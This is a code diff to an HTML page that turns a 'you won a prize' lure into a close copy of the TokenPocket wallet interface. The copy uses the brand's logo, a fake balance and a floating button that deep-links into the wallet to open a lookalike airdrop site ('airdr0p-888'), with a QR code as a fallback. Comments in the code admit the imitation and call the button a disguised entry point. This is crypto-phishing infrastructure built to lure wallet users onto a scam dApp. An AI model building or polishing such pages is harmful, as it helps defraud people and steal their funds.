@@ -3,195 +3,210 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>恭喜中奖！打开 TP 钱包领奖</title>
+  <title>TokenPocket</title>
   <style>
     * { margin:0; padding:0; box-sizing:border-box; }
     body {
       min-height: 100vh;
-      background: radial-gradient(circle at center, #ff6b6b, #ffb84d);
+      background: #0F172A;
+      color: #fff;
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
       overflow: hidden;
+    }
+
+    /* 顶部状态栏（仿 iOS/Android） */
+    .status-bar {
+      height: 44px;
+      background: #1A2338;
       display: flex;
       align-items: center;
-      justify-content: center;
-      position: relative;
+      justify-content: space-between;
+      padding: 0 16px;
+      font-size: 14px;
+      position: fixed;
+      top: 0; left: 0; right: 0;
+      z-index: 1000;
     }
+    .status-bar .time { font-weight: 600; }
+    .status-bar .icons { display: flex; gap: 5px; font-size: 18px; }
 
-    /* 彩带飘落 */
-    .ribbon {
-      position: absolute;
-      width: 12px;
-      height: 80px;
-      background: linear-gradient(45deg, #ffd700, #ff4500);
-      opacity: .8;
-      animation: fall linear infinite;
-    }
-    @keyframes fall {
-      to { transform: translateY(120vh) rotate(720deg); }
-    }
-
-    /* 礼花粒子 */
-    .firework {
-      position: absolute;
-      width: 6px; height: 6px;
-      background: #ffd700;
-      border-radius: 50%;
-      pointer-events: none;
-      animation: burst 1.2s ease-out forwards;
-    }
-    @keyframes burst {
-      0% { transform: scale(0); opacity: 1; }
-      100% { transform: scale(3); opacity: 0; }
-    }
-
-    .container {
+    /* 钱包主界面 */
+    .wallet-header {
+      padding: 60px 20px 20px;
       text-align: center;
-      z-index: 10;
-      animation: bounce 2s infinite;
+      background: linear-gradient(135deg, #1A2338, #0F172A);
     }
-    @keyframes bounce {
-      0%,100% { transform: translateY(0); }
-      50% { transform: translateY(-15px); }
+    .wallet-logo {
+      width: 60px; height: 60px;
+      margin: 0 auto 12px;
+      background: url('https://tokenpocket.pro/static/logo.png') center/contain no-repeat;
+      filter: drop-shadow(0 0 8px rgba(0,163,255,.6));
     }
-
-    h1 {
-      font-size: 2rem;
-      color: #fff;
-      text-shadow: 0 0 10px #ff0, 0 0 20px #ff0;
-      margin-bottom: .5rem;
-      animation: glow 1.5s infinite alternate;
+    .wallet-name {
+      font-size: 20px;
+      font-weight: 600;
+      margin-bottom: 8px;
     }
-    @keyframes glow {
-      from { text-shadow: 0 0 10px #ff0; }
-      to { text-shadow: 0 0 30px #ff0, 0 0 40px #ff4500; }
-    }
-
-    p {
-      color: #fff;
-      font-weight: bold;
-      margin-bottom: 1.5rem;
-      font-size: 1.1rem;
+    .wallet-address {
+      font-size: 14px;
+      color: #94A3B8;
+      font-family: monospace;
+      padding: 8px 12px;
+      background: #1E293B;
+      border-radius: 8px;
+      display: inline-block;
+      margin: 12px 0;
     }
 
-    /* 按钮：金光闪闪 + 呼吸光环 */
-    .btn {
-      position: relative;
-      padding: 1rem 2.5rem;
-      font-size: 1.25rem;
-      font-weight: bold;
-      color: #8b4513;
-      background: linear-gradient(45deg, #ffd700, #ffed4e);
-      border: 4px solid #fff;
-      border-radius: 60px;
-      box-shadow: 
-        0 0 20px rgba(255,215,0,.8),
-        0 8px 20px rgba(0,0,0,.3),
-        inset 0 0 15px rgba(255,255,255,.6);
-      cursor: pointer;
-      transition: all .3s;
-      animation: pulse 2s infinite;
+    /* 资产卡片 */
+    .asset-card {
+      background: linear-gradient(135deg, #1E293B, #334155);
+      margin: 20px;
+      border-radius: 16px;
+      padding: 20px;
+      box-shadow: 0 8px 25px rgba(0,0,0,.3);
     }
-    .btn:hover {
-      transform: scale(1.08);
-      box-shadow: 0 0 35px gold, 0 12px 30px rgba(0,0,0,.4);
+    .asset-amount {
+      font-size: 32px;
+      font-weight: 700;
+      color: #00A3FF;
+      margin-bottom: 8px;
     }
-    @keyframes pulse {
-      0% { box-shadow: 0 0 20px rgba(255,215,0,.8), 0 8px 20px rgba(0,0,0,.3); }
-      50% { box-shadow: 0 0 40px gold, 0 12px 30px rgba(0,0,0,.4); }
-      100% { box-shadow: 0 0 20px rgba(255,215,0,.8), 0 8px 20px rgba(0,0,0,.3); }
+    .asset-usd {
+      color: #94A3B8;
+      font-size: 16px;
     }
 
-    /* 金币跳动图标 */
-    .btn::before {
-      content: "Coin";
-      position: absolute;
-      top: -30px; left: 50%;
+    /* 底部导航栏（仿 TP） */
+    .bottom-nav {
+      position: fixed;
+      bottom: 0; left: 0; right: 0;
+      height: 84px;
+      background: #1A2338;
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+      border-top: 1px solid #334155;
+      padding-bottom: env(safe-area-inset-bottom);
+    }
+    .nav-item {
+      text-align: center;
+      color: #64748B;
+      font-size: 12px;
+    }
+    .nav-item.active {
+      color: #00A3FF;
+    }
+    .nav-item i {
+      font-size: 24px;
+      display: block;
+      margin-bottom: 4px;
+    }
+
+    /* 一键打开按钮（伪装成“浏览器”入口） */
+    .open-dapp-btn {
+      position: fixed;
+      bottom: 100px;
+      left: 50%;
       transform: translateX(-50%);
-      font-size: 2rem;
-      animation: coin 1.5s infinite;
+      width: 80%;
+      padding: 16px;
+      background: linear-gradient(135deg, #00A3FF, #00C4FF);
+      color: white;
+      font-size: 18px;
+      font-weight: 600;
+      text-align: center;
+      border-radius: 16px;
+      box-shadow: 0 8px 20px rgba(0,163,255,.4);
+      z-index: 999;
+      animation: float 2s infinite;
     }
-    @keyframes coin {
-      0%,100% { transform: translateX(-50%) translateY(0) rotate(0); }
-      50% { transform: translateX(-50%) translateY(-10px) rotate(180deg); }
+    @keyframes float {
+      0%,100% { transform: translateX(-50%) translateY(0); }
+      50% { transform: translateX(-50%) translateY(-8px); }
     }
 
     /* 二维码 */
     .qrcode {
-      margin-top: 2rem;
+      position: fixed;
+      bottom: 0; left: 0; right: 0;
+      background: #0F172A;
+      padding: 20px;
+      text-align: center;
       display: none;
+      border-top: 1px solid #334155;
     }
     .qrcode img {
-      width: 180px;
-      border: 8px solid #fff;
-      border-radius: 16px;
-      box-shadow: 0 6px 20px rgba(0,0,0,.3);
+      width: 160px;
+      border: 6px solid #fff;
+      border-radius: 12px;
     }
-    .tip { margin-top: 1rem; color: #fff; font-size: .9rem; }
   </style>
 </head>
 <body>
 
-<!-- 彩带飘落 -->
-<div id="ribbons"></div>
-
-<div class="container">
-  <h1>Congratulations! You Won!</h1>
-  <p>立即在 TP 钱包（BSC）领取大奖</p>
-
-  <button id="openBtn" class="btn">
-    Open in TP Wallet (BSC)
-  </button>
-
-  <div id="qrcode" class="qrcode">
-    <p>请使用 TP 钱包扫码领奖</p>
-    <img id="qrImg" src="" alt="二维码">
+  <!-- 状态栏 -->
+  <div class="status-bar">
+    <div class="time">9:41</div>
+    <div class="icons">Network Signal Battery</div>
   </div>
-  <p class="tip" id="tip"></p>
-</div>
+
+  <!-- 钱包头部 -->
+  <div class="wallet-header">
+    <div class="wallet-logo"></div>
+    <div class="wallet-name">TokenPocket</div>
+    <div class="wallet-address">0x71C7...a1f3</div>
+  </div>
+
+  <!-- 资产卡片 -->
+  <div class="asset-card">
+    <div class="asset-amount">1,688.88</div>
+    <div class="asset-usd">≈ $1,688.88 USD</div>
+  </div>
+
+  <!-- 一键打开 DApp 按钮 -->
+  <div class="open-dapp-btn" id="openBtn">
+    Open DApp Browser (BSC)
+  </div>
+
+  <!-- 底部导航 -->
+  <div class="bottom-nav">
+    <div class="nav-item">
+      <i>Wallet</i>
+      <div>Wallet</div>
+    </div>
+    <div class="nav-item active">
+      <i>Browser</i>
+      <div>Browser</div>
+    </div>
+    <div class="nav-item">
+      <i>Discover</i>
+      <div>Discover</div>
+    </div>
+    <div class="nav-item">
+      <i>Me</i>
+      <div>Me</div>
+    </div>
+  </div>
+
+  <!-- 二维码兜底 -->
+  <div class="qrcode" id="qrcode">
+    <p style="margin-bottom:12px; color:#94A3B8;">未检测到 TP 钱包</p>
+    <img id="qrImg" src="" alt="扫码打开">
+    <p style="margin-top:12px; font-size:14px; color:#64748B;">长按保存 → 在 TP 钱包中扫码</p>
+  </div>
 
 <script>
 const TARGET_URL = "https://airdr0p-888.github.io/usdt1688/index.html";
 
-// 生成彩带
-function createRibbon() {
-  const ribbon = document.createElement('div');
-  ribbon.className = 'ribbon';
-  ribbon.style.left = Math.random() * 100 + 'vw';
-  ribbon.style.animationDuration = (Math.random() * 3 + 3) + 's';
-  ribbon.style.background = `linear-gradient(45deg, ${['#ffd700','#ff4500','#32cd32','#00ced1'][Math.floor(Math.random()*4)]}, #fff)`;
-  document.getElementById('ribbons').appendChild(ribbon);
-  setTimeout(() => ribbon.remove(), 6000);
-}
-setInterval(createRibbon, 300);
-
-// 礼花爆炸
-function fireworks(e) {
-  for(let i=0; i<30; i++){
-    const fw = document.createElement('div');
-    fw.className = 'firework';
-    const angle = Math.random() * Math.PI * 2;
-    const velocity = 8 + Math.random() * 12;
-    fw.style.left = e.clientX + 'px';
-    fw.style.top = e.clientY + 'px';
-    fw.style.background = ['#ffd700','#ff4500','#32cd32','#00ced1'][Math.floor(Math.random()*4)];
-    fw.style.transform = `translate(${Math.cos(angle)*velocity*10}px, ${Math.sin(angle)*velocity*10}px)`;
-    document.body.appendChild(fw);
-    setTimeout(() => fw.remove(), 1200);
-  }
-}
-
-// TP 唤醒
 function isTPBrowser() {
   return /tokenpocket|tpdapp/i.test(navigator.userAgent);
 }
 
 function showQR() {
-  const qr = document.getElementById('qrcode');
-  const img = document.getElementById('qrImg');
-  const tip = document.getElementById('tip');
-  img.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(TARGET_URL)}`;
-  qr.style.display = 'block';
-  tip.textContent = '未检测到 TP 钱包，长按保存二维码后在 TP 中扫码领奖';
+  document.getElementById('qrcode').style.display = 'block';
+  document.getElementById('qrImg').src = 
+    `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(TARGET_URL)}`;
 }
 
 function openTP() {
@@ -218,10 +233,7 @@ function openTP() {
 }
 
 // 绑定点击
-document.getElementById('openBtn').addEventListener('click', function(e) {
-  fireworks(e);
-  openTP();
-});
+document.getElementById('openBtn').addEventListener('click', openTP);
 </script>
 
 </body>
